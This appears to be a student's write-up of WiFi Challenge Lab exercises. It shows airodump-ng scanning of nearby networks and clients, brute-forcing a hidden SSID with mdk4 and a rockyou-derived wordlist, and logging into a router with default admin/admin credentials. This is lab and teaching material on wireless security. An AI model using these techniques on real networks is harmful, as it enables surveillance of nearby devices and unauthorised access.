# h6 - Wifi


## Wifi challenge lab 2.1 haasteet 1-5

### 01. What is the channel that the wifi-global Access Point (AP) is currently using?

sudo su  
cat /root/flag.txt  

<img width="601" height="201" alt="Näyttökuva 2026-04-27 233459" src="https://github.com/user-attachments/assets/c93cd2a7-86b6-4ebf-aad8-543412596591" />


I created the Wifi folder using the command mkdir ~/wifi  

I scanned all channels to find the "wifi-global" network and its channel:  
sudo airmon-ng start wlan0  
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg  

<img width="1098" height="250" alt="image" src="https://github.com/user-attachments/assets/40128e6f-0363-4f1a-b345-034bce312bc7" />

The channel used by wifi-global, channel 44, can be found in the CH column.

### 02. What is the MAC of the wifi-IT client?

I first searched for the wifi-IT network by scanning all networks with the command: 
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg  

Wifi-IT (BSSID: F0:9F:C2:1A:CA:25) was on channel 11. Next, I scanned only channel 11 by targeting the scan at wifi-IT's BSSID: 
sudo airodump-ng wlan0mon -c 11 --bssid F0:9F:C2:1A:CA:25  

The STATION section showed a client connected to wifi-IT, with the MAC address 10:F9:6F:AC:53:52.  

<img width="851" height="282" alt="Näyttökuva 2026-04-28 194438" src="https://github.com/user-attachments/assets/0ca351e7-c9a2-4cc9-9775-aae13eb558c3" />

### 03. What is the probe of 78:C1:A7:BF:72:46 that follows the format of the other networks in the range (wifi-)?

I first tried scanning with the command: sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg, but 78:C1:A7:BF:72:46 did not appear.  
After that, I used the command grep "78:C1:A7:BF:72:46" scan-01.csv, and the result showed that the device was probing for the network wifi-offices.  

<img width="1016" height="63" alt="image" src="https://github.com/user-attachments/assets/53614cda-20da-4e03-8e30-3f77a766d42d" />  

### 04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?

With commands:
cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt  
iwconfig wlan0mon channel 11  
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt  

<img width="871" height="233" alt="image" src="https://github.com/user-attachments/assets/b33503e3-5de4-4b44-9e93-f775219cf777" />

The hidden AP's ESSID is: wifi-free  

### 05. What is the flag in the hidden AP router behind default credentials?

With command nano ~/wifi/free.conf loin free.conf -file.  

<img width="189" height="134" alt="image" src="https://github.com/user-attachments/assets/6553d87c-e1be-4ca6-83cf-1e5191c6f4c3" />

I connected to the network with the command wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/free.conf
I opened another terminal, where I ran as root:
sudo su
dhclient wlan2 -v
I opened 192.168.16.1 in the browser and logged in as user admin with password admin, which allowed me to find the flag.  

<img width="694" height="308" alt="image" src="https://github.com/user-attachments/assets/bcd4158a-d644-4a19-8ad7-fd87997414d9" />

### Mitä opin?

Harjoituksessa opin Wi-Fi-verkkojen skannausta ja analysointia. Yllättävintä oli, kuinka helposti verkkojen tietoja voidaan kerätä. Ainoastaan airodump-ng-komennolla näkee kaikki lähialueen verkot, niiden kanavat ja yhdistyneet laitteet.  

### Miten suhtautumiseni WLAN:in turvallisuuteen muuttui?

Olen tiedostanut oletussalasanojen olevan tietoturvariski, mutta nyt sen näkeminen konkreettisesti käytännössä teki siitä paljon todellisemman.  


### Lähteet: 

WiFi Challenge Lab. URL: https://lab.wifichallenge.com/. Katsottu: 29.4.2026.



















